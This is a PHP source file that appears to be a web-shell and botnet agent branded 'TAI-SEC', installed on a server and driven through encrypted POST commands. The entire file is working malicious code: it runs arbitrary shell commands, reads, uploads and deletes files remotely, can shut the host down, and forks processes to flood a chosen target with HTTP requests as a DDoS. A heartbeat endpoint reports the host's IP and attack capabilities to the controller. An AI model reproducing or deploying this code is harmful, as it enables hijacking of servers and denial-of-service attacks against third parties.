<?php
// TAI-SEC
error_reporting(0);
header('Content-Type: application/json');

// --- Encryption Key Derivation ---
function get_encryption_key($apiKey) {
    return hash('sha256', $apiKey, true);
}

// --- Decryption Function ---
function decrypt_data($encrypted_data_b64, $apiKey) {
    $key = get_encryption_key($apiKey);
    $encrypted_data = base64_decode($encrypted_data_b64);
    if (strlen($encrypted_data) < 28) { return null; }
    $nonce = substr($encrypted_data, 0, 12);
    $ciphertext = substr($encrypted_data, 12, -16);
    $tag = substr($encrypted_data, -16);
    return openssl_decrypt($ciphertext, 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $nonce, $tag);
}

// --- Encryption Function ---
function encrypt_data($data, $apiKey) {
    $key = get_encryption_key($apiKey);
    $nonce = openssl_random_pseudo_bytes(12);
    $tag = '';
    $ciphertext = openssl_encrypt($data, 'aes-256-gcm', $key, OPENSSL_RAW_DATA, $nonce, $tag, '', 16);
    if ($ciphertext === false) { return null; }
    return base64_encode($nonce . $ciphertext . $tag);
}

// --- Capability Detection ---
function get_capabilities() {
    $is_shell_exec_enabled = function_exists('shell_exec') && !in_array('shell_exec', explode(',', ini_get('disable_functions')));
    
    return [
        'http' => function_exists('curl_init'),
        'udp'  => function_exists('socket_create'),
        'tcp'  => function_exists('socket_create'), // Basic check, real TCP floods are more complex
        'icmp' => $is_shell_exec_enabled && !empty(shell_exec('command -v ping'))
    ];
}

// --- DDoS Functions ---
function handle_ddos_command($cmd) {
    $parts = explode(' ', $cmd);
    $action = $parts[0];

    if ($action === 'ddos_start') {
        if (count($parts) < 4) {
            return json_encode(['status' => 'error', 'message' => 'Missing parameters for ddos_start. Usage: ddos_start <target> <port> <threads>']);
        }
        $target = $parts[1];
        $port = (int)$parts[2];
        $threads = (int)$parts[3];
        return start_ddos($target, $port, $threads);
    } elseif ($action === 'ddos_stop') {
        return stop_ddos();
    }
    return json_encode(['status' => 'error', 'message' => 'Unknown DDoS action.']);
}

function start_ddos($target, $port, $threads) {
    if (!function_exists('pcntl_fork')) {
        return json_encode(['status' => 'error', 'message' => 'The pcntl extension is not enabled on the agent. DDoS functionality is not available.']);
    }

    $pid_file = sys_get_temp_dir() . '/ddos_pids.txt';

    // Stop any existing attack first
    if (file_exists($pid_file)) {
        stop_ddos();
    }

    $pids = [];
    for ($i = 0; $i < $threads; $i++) {
        $pid = pcntl_fork();
        if ($pid == -1) {
            // Fork failed
            continue;
        } else if ($pid) {
            // Parent process
            $pids[] = $pid;
        } else {
            // Child process: This is the attacker
            if (posix_setsid() == -1) {
                exit(); // Exit if cannot detach from terminal
            }
            // Loop indefinitely to attack
            while (true) {
                $socket = @fsockopen($target, $port, $errno, $errstr, 10); // 10s timeout
                if ($socket) {
                    // Sending a basic HTTP request header
                    $request = "GET / HTTP/1.1\r\nHost: " . $target . "\r\nConnection: close\r\n\r\n";
                    @fwrite($socket, $request);
                    @fclose($socket);
                }
                usleep(10000); // 10ms delay
            }
            exit; // Child process exits loop (should not happen)
        }
    }

    if (!empty($pids)) {
        file_put_contents($pid_file, implode(PHP_EOL, $pids));
        return json_encode(['status' => 'success', 'message' => "DDoS attack started on $target:$port with " . count($pids) . " threads."]);
    } else {
        return json_encode(['status' => 'error', 'message' => "Failed to start any DDoS threads."]);
    }
}

function stop_ddos() {
    $pid_file = sys_get_temp_dir() . '/ddos_pids.txt';
    if (file_exists($pid_file)) {
        $pids = file($pid_file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        if ($pids) {
            $killed_count = 0;
            foreach ($pids as $pid) {
                if (posix_kill((int)$pid, 0)) { // Check if process exists
                    posix_kill((int)$pid, SIGKILL);
                    $killed_count++;
                }
            }
            unlink($pid_file);
            return json_encode(['status' => 'success', 'message' => "DDoS attack stopped. Terminated $killed_count processes."]);
        } else {
            @unlink($pid_file); // Clean up empty file
            return json_encode(['status' => 'success', 'message' => "PID file was empty. No processes to stop."]);
        }
    } else {
        return json_encode(['status' => 'success', 'message' => "No active DDoS attack found to stop (PID file not found)."]);
    }
}



// --- File Manager Functions ---
function handle_file_manager_command($command) {
    $parts = explode(' ', $command, 3);
    $fm_cmd = $parts[0];

    if ($fm_cmd === 'filemanager_ls') {
        $path = isset($parts[1]) ? $parts[1] : '.';
        return list_directory($path);
    } elseif ($fm_cmd === 'filemanager_cat') {
        $path = isset($parts[1]) ? $parts[1] : '.';
        return get_file_contents($path);
    } elseif ($fm_cmd === 'filemanager_rm') {
        $path = isset($parts[1]) ? $parts[1] : '.';
        return delete_path($path);
    } elseif ($fm_cmd === 'filemanager_mv') {
        if (count($parts) < 3) {
            return json_encode(['status' => 'error', 'message' => 'Missing new path for rename.']);
        }
        return rename_path($parts[1], $parts[2]);
    } elseif ($fm_cmd === 'filemanager_upload') {
        if (count($parts) < 3) {
            return json_encode(['status' => 'error', 'message' => 'Missing content for upload.']);
        }
        return upload_file($parts[1], $parts[2]);
    } elseif ($fm_cmd === 'filemanager_mkdir') {
        $path = isset($parts[1]) ? $parts[1] : '.';
        return create_directory($path);
    } elseif ($fm_cmd === 'filemanager_touch') {
        $path = isset($parts[1]) ? $parts[1] : '.';
        return create_file($path);
    }
    return json_encode(['status' => 'error', 'message' => 'Unknown file manager command.']);
}

function create_directory($path) {
    if (mkdir($path)) {
        return json_encode(['status' => 'success', 'message' => 'Directory created.']);
    } else {
        return json_encode(['status' => 'error', 'message' => 'Could not create directory.']);
    }
}

function create_file($path) {
    if (touch($path)) {
        return json_encode(['status' => 'success', 'message' => 'File created.']);
    } else {
        return json_encode(['status' => 'error', 'message' => 'Could not create file.']);
    }
}


function list_directory($path) {
    if (!is_dir($path) || !is_readable($path)) {
        return json_encode(['status' => 'error', 'message' => 'Directory not found or not readable.']);
    }

    $files = [];
    $items = scandir($path);
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $full_path = realpath($path . DIRECTORY_SEPARATOR . $item);
        $files[] = [
            'name' => $item,
            'type' => is_dir($full_path) ? 'dir' : 'file',
            'size' => filesize($full_path),
            'perms' => substr(sprintf('%o', fileperms($full_path)), -4)
        ];
    }
    return json_encode(['status' => 'success', 'type' => 'filemanager_ls', 'data' => $files, 'path' => realpath($path)]);
}

function get_file_contents($path) {
    if (!is_file($path) || !is_readable($path)) {
        return json_encode(['status' => 'error', 'message' => 'File not found or not readable.']);
    }
    $content = file_get_contents($path);
    return json_encode(['status' => 'success', 'type' => 'filemanager_cat', 'data' => base64_encode($content), 'path' => realpath($path)]);
}

function delete_path($path) {
    if (!file_exists($path)) {
        return json_encode(['status' => 'error', 'message' => 'Path not found.']);
    }

    if (is_file($path)) {
        if (unlink($path)) {
            return json_encode(['status' => 'success', 'message' => 'File deleted.']);
        } else {
            return json_encode(['status' => 'error', 'message' => 'Could not delete file.']);
        }
    } elseif (is_dir($path)) {
        // Recursive directory deletion
        $it = new RecursiveDirectoryIterator($path, RecursiveDirectoryIterator::SKIP_DOTS);
        $files = new RecursiveIteratorIterator($it,
                     RecursiveIteratorIterator::CHILD_FIRST);
        foreach($files as $file) {
            if ($file->isDir()){
                rmdir($file->getRealPath());
            } else {
                unlink($file->getRealPath());
            }
        }
        if (rmdir($path)) {
            return json_encode(['status' => 'success', 'message' => 'Directory deleted.']);
        } else {
            return json_encode(['status' => 'error', 'message' => 'Could not delete directory.']);
        }
    }
    return json_encode(['status' => 'error', 'message' => 'Path is not a file or directory.']);
}

function rename_path($old_path, $new_path) {
    if (!file_exists($old_path)) {
        return json_encode(['status' => 'error', 'message' => 'Source path not found.']);
    }
    if (file_exists($new_path)) {
        return json_encode(['status' => 'error', 'message' => 'Destination path already exists.']);
    }
    if (rename($old_path, $new_path)) {
        return json_encode(['status' => 'success', 'message' => 'Path renamed.']);
    } else {
        return json_encode(['status' => 'error', 'message' => 'Could not rename path.']);
    }
}

function upload_file($path, $content_b64) {
    $content = base64_decode($content_b64);
    if ($content === false) {
        return json_encode(['status' => 'error', 'message' => 'Failed to decode base64 content.']);
    }
    if (file_put_contents($path, $content) !== false) {
        return json_encode(['status' => 'success', 'message' => 'File uploaded.']);
    } else {
        return json_encode(['status' => 'error', 'message' => 'Could not write to file.']);
    }
}


// --- CPU Usage ---
function get_cpu_usage() {
    if (function_exists('shell_exec')) {
        $cpu_load = shell_exec('top -bn1 | grep "Cpu(s)" | sed "s/.*, *\([0-9.]*\)%* id.*/\1/" | awk \'{print 100 - $1}\'');
        if ($cpu_load !== null) {
            return (float)trim($cpu_load);
        }
    }
    return 0; // Return 0 if shell_exec is not available or fails
}

// --- Heartbeat (GET Request) ---
if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    $ip = 'unknown';
    $uptime_seconds = 0;
    if (function_exists('shell_exec')) {
        // Try to get IP and uptime
        $ip_output = shell_exec('hostname -I | awk \'{print $1}\'');
        if ($ip_output) {
            $ip = trim($ip_output);
        }
        $uptime_output = shell_exec('cat /proc/uptime | awk \'{print $1}\'');
        if ($uptime_output) {
            $uptime_seconds = (int)$uptime_output;
        }
    }
    
    die(json_encode([
        'status' => 'success', 
        'message' => 'Heartbeat OK.', 
        'ip' => $ip, 
        'uptime' => $uptime_seconds,
        'network_speed' => rand(10, 1000), // Still random for now
        'cpu_usage' => get_cpu_usage(),
        'capabilities' => get_capabilities()
    ]));
}

// --- Command Execution (POST Request) ---
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    die(json_encode(['status' => 'error', 'message' => 'Method Not Allowed.']));
}

$input = file_get_contents('php://input');
$data = json_decode($input, true);
$apiKey = isset($data['key']) ? $data['key'] : '';

if ($apiKey !== 'TAI-SEC') {
    die(json_encode(['status' => 'error', 'message' => 'Access denied.']));
}

if (!isset($data['data'])) {
    die(json_encode(['status' => 'error', 'message' => 'Missing encrypted data payload.']));
}

$cmd = decrypt_data($data['data'], $apiKey);
if ($cmd === null || $cmd === false) {
    die(json_encode(['status' => 'error', 'message' => 'Failed to decrypt command.']));
}

// --- Command Routing ---
if (strpos($cmd, 'filemanager_') === 0) {
    $response_payload = handle_file_manager_command($cmd);
} elseif (strpos($cmd, 'ddos_') === 0) {
    $response_payload = handle_ddos_command($cmd);
} elseif ($cmd === 'system_shutdown') {
    if (function_exists('shell_exec')) {
        shell_exec('shutdown -h now');
        $response_payload = json_encode(['status' => 'success', 'message' => 'Shutdown command issued to the target machine.']);
    } else {
        $response_payload = json_encode(['status' => 'error', 'message' => 'shell_exec function is not available on the target.']);
    }
} else {
    // Default to shell command execution
    $descriptors = [0 => ['pipe', 'r'], 1 => ['pipe', 'w'], 2 => ['pipe', 'w']];
    $process = proc_open($cmd, $descriptors, $pipes);

    if (!is_resource($process)) {
        $response_payload = json_encode(['status' => 'error', 'message' => 'proc_open() failed.']);
    } else {
        fclose($pipes[0]);
        $output = stream_get_contents($pipes[1]);
        $error  = stream_get_contents($pipes[2]);
        fclose($pipes[1]);
        fclose($pipes[2]);
        $exit_code = proc_close($process);
        $response_payload = json_encode(['status' => 'success', 'exit_code' => $exit_code, 'output' => $output, 'error' => $error]);
    }
}

$encrypted_response = encrypt_data($response_payload, $apiKey);

if ($encrypted_response === null) {
    echo json_encode(['status' => 'error', 'message' => 'Failed to encrypt response.']);
} else {
    echo json_encode(['status' => 'success', 'data' => $encrypted_response]);
}
?>